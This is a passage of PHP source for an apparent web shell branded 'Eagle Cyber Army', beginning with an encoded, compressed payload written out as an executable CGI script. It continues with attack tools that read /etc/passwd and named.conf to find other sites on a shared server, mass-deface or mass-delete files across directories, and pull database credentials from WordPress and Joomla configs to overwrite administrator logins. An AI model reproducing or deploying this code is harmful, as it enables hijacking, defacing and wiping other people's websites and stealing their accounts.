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
	";
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, gzinflate(base64_decode($cgi_script)));
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
        chmod($pekok, 0755);
	echo "<iframe src='eca_cgi/cgi.eca' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
}
// UnZipper Tools
elseif(isset($_GET['unzipper'])){
if($_GET['unzipper'] == 'auto'){
?>
<center><h1 style="font-size:33px;">Upload .Zip File</h1><br>
<?php
}elseif($_GET['unzipper'] == 'manual'){
?>
<center><h1 style="font-size:33px;">Unzip Manual</h1><br>
<?php
}else{
?>
<center><h1 style="font-size:33px;">UnZipper Tools</h1><br>
<?php
}
echo "
<br>
<hr width='100%' style='position:absolute;top:368px;'><div class='fitur' style='position:relative;'>
<ul>
<li>
<a href='?unzipper=auto&dir=".$dir."'>Upload .Zip File</a>
</li>
<li>
<a href='?unzipper=manual&dir=".$dir."'>Unzip Manual</a>
</li>
</ul>
</div>
</center>
<br><br>";
// Upload and Unzip
if($_GET['unzipper'] == 'auto'){
if($_FILES["zip_file"]["name"]) {
	$lokasi = $_POST['lokasi'];
	$filename = $_FILES["zip_file"]["name"];
	$source = $_FILES["zip_file"]["tmp_name"];
	$type = $_FILES["zip_file"]["type"];
	$name = pathinfo($filename);
	$name = $name['extension'];
	$accepted_types = ['application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed'];
	foreach($accepted_types as $mime_type) {
		if($mime_type == $type) {
			$okay = true;
			break;
		} 
	}
	if($name == 'zip') {
  $path = $dir.'/';
  $filenoext = basename ($filename, '.zip'); 
  $filenoext = basename ($filenoext, '.ZIP');
  $targetdir = $path . $filenoext;
  $targetzip = $path . $filename; 
  $move	 	 = @move_uploaded_file($source, $targetzip);
	if($move) {
		$zip = new ZipArchive();
		$x = $zip->open($targetzip); 
		if ($x === true) {
			$zip->extractTo($lokasi);
			$zip->close();
 
			unlink($targetzip);
		}
		die("<br><center><b style='color:lime;'>Succses :)</b></center>");
	} else {	
		die("<br><center><b style='color:red;'>Error :(</b></center>");
	}
}else{
die("<br><center><b style='color:yellow;'>That is not .zip extension!</b></center>");
}
}
echo '<center>
<form enctype="multipart/form-data" method="post" action="">
<label>
Zip File : 
<input type="file" name="zip_file" />
</label>
<br>
Save To:
<br>
<input type=\'text\' name=\'lokasi\' value='.$dir.' style=\'width: 450px;\' height=\'10\' autocomplete=\'off\'>
<br>
<input type="submit" style=\'width: 450px;\' name="submit" value="Unzip" />
</form>';
echo "</center>";
}
// Manual Unzip
elseif($_GET['unzipper'] == 'manual'){
	if($_POST['extrak']){
	$save=$_POST['save'];
	$zipnya = $_POST['dir'];
	$cekektensi = explode(".", $zipnya);
	$cekdulu = strtolower($cekektensi[1]) == 'zip' ? true : false;
	if(!$cekdulu){
		die('<br><center><b style=\'color:yellow;\'>That is not .zip extension!</b></center>');
	}else{
	$zip = new ZipArchive;
	$res = $zip->open($zipnya);
	if ($res === TRUE) {
		$zip->extractTo($save);
		$zip->close();
	die ('<br><center><font color=\'lime\'>Success , Location : <b>'.$save.'</b></font></center>');
	} else {
	die ('<br><center><font color=\'red\'>Error :(</font></center>');
	}
	}
}
echo "<center>
	<form action='' method='post'>
	Zip Location:
	<br>
	<input type='text' autocomplete='off' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'>
	<br>
	Save To:
	<br>
	<input type='text' autocomplete='off' name='save' value='$dir' style='width: 450px;' height='10'>
	<br>
	<input type='submit' name='extrak' value='Unzip' style='width: 450px;'>
	</form>
	</center>";
}
}
// Jumping
elseif(isset($_GET['jumping'])) {
			function getuser() {
			$fopen = fopen("/etc/passwd", "r") or die("<center><h2><font color=red>Error : can't read [ /etc/passwd ]</font></h2></center>");
			while($read = fgets($fopen)) {
			preg_match_all('/(.*?):x:/', $read, $getuser);
			$user[] = $getuser[1][0];
			}
			return $user;
			}
			function getdomainname() {
			$fopen = fopen("/etc/named.conf", "r");
			while($read = fgets($fopen)) {
			preg_match_all("#/var/named/(.*?).db#", $read, $getdomain);
			$domain[] = $getdomain[1][0];
			}
			return $domain;
			}
			$i = 0;
			foreach(getuser() as $user) {
			$path = "/home/$user/public_html";
			if(is_readable($path)) {
			$status = "[<font color=green>R</font>]";
			if(is_writable($path)) {
			$status = "[<font color=green>RW</font>]";
			}
			$i++;
			print "<center>$status <a href='?explorer&dir=$path'>[<font color=gold>$path</font>]</a></center>";
			if(!function_exists('posix_getpwuid')) print "<br>";
			if(!getdomainname()) print "<center> => <fon color='red'>Can't get domain name</font> </center><br>";
			foreach(getdomainname() as $domain) {
			$userdomain = (object) @posix_getpwuid(@fileowner("/etc/valiases/$domain"));
			$userdomain = $userdomain->name;
			if($userdomain === $user) {
			print "<center> => <a href='http://$domain/' target='_blank'><font color=green>$domain</font></a><br></center>";
			break;
			}
		}
	}
}
			print ($i === 0) ? "" : "<center><p>Total is $i in ".$GLOBALS['SERVERIP']."</p></center>";
}
// Mass Tools
elseif(isset($_GET['mass_tools'])){
if($_GET['mass_tools'] == 'deface'){
?>
<center><h1 style="font-size:33px;">Mass Deface</h1><br>
<?php
}elseif($_GET['mass_tools'] == 'delete'){
?>
<center><h1 style="font-size:33px;">Mass Delete</h1><br>
<?php
}elseif($_GET['mass_tools'] == 'users_changer'){
if(isset($_POST['changer_wp'])){
?>
<center><h1 style="font-size:33px;">Mass User Changer Wordpress</h1><br>
<?php
}elseif(isset($_POST['changer_joomla'])){
?>
<center><h1 style="font-size:33px;">Mass User Changer Joomla</h1><br>
<?php
}else{
?>
<center><h1 style="font-size:33px;">Mass Users Changer</h1><br>
<?php
}
}else{
?>
<center><h1 style="font-size:33px;">Mass Tools</h1><br>
<?php
}
echo "
<br>";
if($_GET['mass_tools'] == 'users_changer'){
echo "
<hr width='100%' style='position:absolute;top:372px;'><div class='fitur' style='position:relative;'>
<form method='post'>
<ul>
<li>
<input type='submit' name='changer_wp' value='Wordpress'>
</li>
<li>
<input type='submit' name='changer_joomla' value='Joomla'>
</li>
</ul>
</form>
</div>";
}else{
echo "
<hr width='100%' style='position:absolute;top:368px;'><div class='fitur' style='position:relative;'>
<ul>
<li>
<a href='?mass_tools=deface&dir=".$dir."'>Deface</a>
</li>
<li>
<a href='?mass_tools=delete&dir=".$dir."'>Delete</a>
</li>
<li>
<a href='?mass_tools=users_changer&dir=".$dir."'>Users Changer</a>
</li>
</ul>
</div>
</center>
<br><br>";
}
// Mass Deface
if($_GET['mass_tools'] == 'deface'){
function sabun_massal($dir,$namafile,$isi_script) {
if(is_writable($dir)) {
$dira = scandir($dir);
foreach($dira as $dirb) {
$dirc = "$dir/$dirb";
$lokasi = $dirc.'/'.$namafile;
if($dirb === '.') {
file_put_contents($lokasi, $isi_script);
} elseif($dirb === '..') {
file_put_contents($lokasi, $isi_script);
} else {
if(is_dir($dirc)) {
if(is_writable($dirc)) {
echo "<center>[<font color=lime>DONE</font>] $lokasi<br></center>";
file_put_contents($lokasi, $isi_script);
$idx = sabun_massal($dirc,$namafile,$isi_script);
}
}
}
}
}
}
// Mass Deface 1 Dir
if(isset($_POST['start']) && ($_POST['mass'] == "onedir")) {
		echo "<center><br>";
		$mainpath = $_POST['d_dir'];
		$file = $_POST['d_file'];
		$dir = opendir("$mainpath");
		$code = base64_encode($_POST['script']);
		$indx = base64_decode($code);
		while($row = readdir($dir)){
		$start = @fopen("$row/$file","w+");
		$finish = @fwrite($start,$indx);
		$done = $row.'/'.$file;
		if ($finish){
			echo '[<font color=lime>DONE</font>] <a style="color:white;" href="http://'.$_SERVER['HTTP_HOST'].'/'.$done.'">http://'.$_SERVER['HTTP_HOST'].'/'.$done.'</a><br>'; }
		}
		echo "</center>";
	}
// Mass Deface All Dir
elseif(isset($_POST['start']) && ($_POST['mass'] == "alldir")) {
echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";
}else{
echo '	<center><form method="post">
		Select Type:<br>
		<select class="select" name="mass"  style="width: 450px;" height="10">
		<option value="onedir">Mass Deface 1 Dir</option>
		<option value="alldir">Mass Deface ALL Dir</option>
		</center></select><br>
		Folder:<br>
		<input type="text" autocomplete=\'off\' name="d_dir" value="'.$dir.'" style="width: 450px;" height="10"><br>
		Filename:<br>
		<input type="text" autocomplete=\'off\' name="d_file" value="ECA.php" style="width: 450px;" height="10"><br>
		Script Deface:<br>
		<textarea name="script" style="width: 450px; height: 200px;">Hacked By HiddenCoder Of Eagle Cyber Army</textarea><br>
		<input type="submit" name="start" value="Mass Deface" style="width: 450px;">
		</form></center>';
	}
}
// Mass Delete
elseif($_GET['mass_tools'] == 'delete'){
function hapus_massal($dir,$namafile) {
if(is_writable($dir)) {
$dira = scandir($dir);
foreach($dira as $dirb) {
$dirc = "$dir/$dirb";
$lokasi = $dirc.'/'.$namafile;
if($dirb === '.') {
if(file_exists("$dir/$namafile")) {
unlink("$dir/$namafile");
}
} elseif($dirb === '..') {
if(file_exists("".dirname($dir)."/$namafile")) {
unlink("".dirname($dir)."/$namafile");
}
} else {
if(is_dir($dirc)) {
if(is_writable($dirc)) {
if(file_exists($lokasi)) {
echo "<center>[<font color=lime>DELETED</font>] $lokasi</center><br>";
unlink($lokasi);
$idx = hapus_massal($dirc,$namafile);
}
}
}
}
}
}
}
if(isset($_POST['massdel'])) {
        echo "<div style='margin: 5px auto; padding: 5px'>";
        hapus_massal($_POST['d_dir'], $_POST['d_file']);
        echo "</div>";
    } else {
    echo "<center><form method='post'>
    <b>Folder:</b><br>
    <input autocomplete='off' style='width: 450px;' type='text' name='d_dir' value='$dir'><br>
    <b>Filename:</b><br>
    <input autocomplete='off' style='width: 450px;' type='text' name='d_file' value='ECA.php'><br>
    <input type='submit' name='massdel' value='Submit' style='width: 450px;'>
    </form></center>
    </div>
    </div>
    </div>
    </div>";
}
}
// Mass Users Changer
elseif($_GET['mass_tools'] == 'users_changer'){
// Mass Users Changer WordPress 
if(isset($_POST['changer_wp'])){
if($_POST['sikat']) {
    echo "<br><br><center><form method='post'>
        Link Config: <br>
        <textarea name='link' style='width: 450px; height:250px;'>";
    GrabUrl($_POST['linkconfig'],'wordpress');   
    echo"</textarea><br>
        User Baru:<br> <input type='text' name='newuser' autocomplete='off' value='hiddencoder'> <br><br>
        Password Baru:<br> <input autocomplete='off' type='text' name='newpasswd' value='hiddencoder'><br><br>
        <input type='submit' style='width: 450px;' name='autowp' value='Submit'>
        </form></center>";
}   else {
        echo "<br><br><center>
        <form method='post'>
        Link Config: <br>
        <input type='text' autocomplete='off' name='linkconfig' height='10' size='50' value='http://".$_SERVER['HTTP_HOST']."/eca_symconf/'><br><br>
        <input type='submit' style='width: 425px;' name='sikat' value='Submit'>
        </form></center>";
    }
   if($_POST['autowp']) {
   
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("rn", $_POST['link']);
        $user = $_POST['newuser'];
        $pass = $_POST['newpasswd'];
        $passx = md5($pass);
        foreach($link as $dir_config) {
            $config = anucurl($dir_config);
            $dbhost = ambilKata($config,"DB_HOST', '","'");
            $dbuser = ambilKata($config,"DB_USER', '","'");
            $dbpass = ambilKata($config,"DB_PASSWORD', '","'");
            $dbname = ambilKata($config,"DB_NAME', '","'");
            $dbprefix = ambilKata($config,"table_prefix  = '","'");
            $prefix = $dbprefix."users";
            $option = $dbprefix."options";
            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
            $db = mysql_select_db($dbname);
            $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
            $result = mysql_fetch_array($q);
            $id = $result[ID];
            $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
            $result2 = mysql_fetch_array($q2);
            $target = $result2[\OPTION_VALUE];
            if(empty($target)) {                
                echo "<center>[-] <font color=red>Error, Can't get domain!</font></center><br>";
            } else {
                echo "<center><font color=blue>[</font> $target <font color=blue>]</font></font></center><br>";
            }
            $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
            if(!$conn OR !$db OR !$update) {
                echo "<center>[-] MySQL Error: <font color=red>".mysql_error()."</font></center><br><br>";
                mysql_close($conn);
            } else {
            		echo "<center>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] CMS : Wordpress<br>";
                    echo "[+] Username: <font color=lime>$user</font><br>";
                    echo "[+] Password: <font color=lime>$pass</font><br><br>";    
                    echo "</center>";
                mysql_close($conn);
            }
        }
    }  
 
}
// Mass Users Changer Joomla 
elseif(isset($_POST['changer_joomla'])){
if($_POST['sikat']) {
    echo "<br><br><center>
        <form method='post'>
        Link Config: <br>
        <textarea name='link' style='width: 450px; height:250px;'>";
    GrabUrl($_POST['linkconfig'],'joomla');  
    echo"</textarea><br>
        User Baru:<br> <input autocomplete='off' type='text' name='newuser' value='hiddencoder'> <br><br>
        Password Baru:<br> <input autocomplete='off' type='text' name='newpasswd' value='hiddencoder'><br><br>
        <input type='submit' style='width: 450px;' name='autojoom' value='Submit'>
        </form></center>";
}   else {
        echo "<br><br><center>
        <form method='post'>
        Link Config: <br>
        <input type='text' autocomplete='off' name='linkconfig' height='10' size='50' value='http://".$_SERVER['HTTP_HOST']."/eca_symconf/'><br><br>
        <input type='submit' style='width: 425px;' name='sikat' value='Submit'>
        </form></center>";
    }
if($_POST['autojoom']) {
   
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("rn", $_POST['link']);
        $user = $_POST['newuser'];
        $pass = $_POST['newpasswd'];
        $passx = md5($pass);
        foreach($link as $dir_config) {
            $config = anucurl($dir_config);
                    $dbhost = ambilKata($config,"host = '","'");
                    $dbuser = ambilKata($config,"user = '","'");
                    $dbpass = ambilKata($config,"password = '","'");
                    $dbname = ambilKata($config,"db = '","'");
                    $dbprefix = ambilKata($config,"dbprefix = '","'");
                    $prefix = $dbprefix."users";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilKata($config,"sitename = '","'");
                    $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE id='$id'");
                    echo "Config => ".$dir_config."<br>";
                    echo "CMS => Joomla<br>";
                    if(empty($site)) {
                        echo "<center>Sitename => <font color=red>Error, Can't get domain!</font></center><br>";
                    } else {
                        echo "<center>Sitename => $site</center><br>";
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "<center>Status => <font color=red>".mysql_error()."</font></center><br><br>";
                    } else {
                    	echo "<center>";
                        echo "[+] Status : Done<br>";
                        echo "[+] CMS : Joomla<br>";
                        echo "[+] Username : <font color=lime>$user</font><br>"; 
                        echo "[+] Password : <font color=lime>$pass</font><br><br>";
                        echo "</center>";
                    }
                    mysql_close($conn);
                    }
    }  
}
}
}
// PHP Info
elseif(isset($_GET['php_info'])){
	@ob_start();
	eval("phpinfo();");
	$buff = @ob_get_contents();
	@ob_end_clean();	
	$awal = strpos($buff,"<body>")+6;
	$akhir = strpos($buff,"</body>");
